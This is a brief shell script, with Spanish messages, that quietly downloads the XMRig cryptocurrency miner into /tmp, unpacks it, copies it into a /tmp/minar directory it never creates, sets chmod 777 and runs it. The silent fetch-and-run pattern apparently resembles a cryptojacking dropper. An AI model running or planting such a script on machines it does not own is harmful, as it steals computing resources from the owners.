#!/bin/sh
echo
echo instalando...
echo
cd /
cd /tmp
wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz -q -O xmrig.tar.gz
tar -xzvf xmrig.tar.gz
cd xmrig-6.18.1/
cp xmrig /tmp/minar/
cd /tmp/minar/
chmod 777 xmrig
chmod 777 *
./xmrig
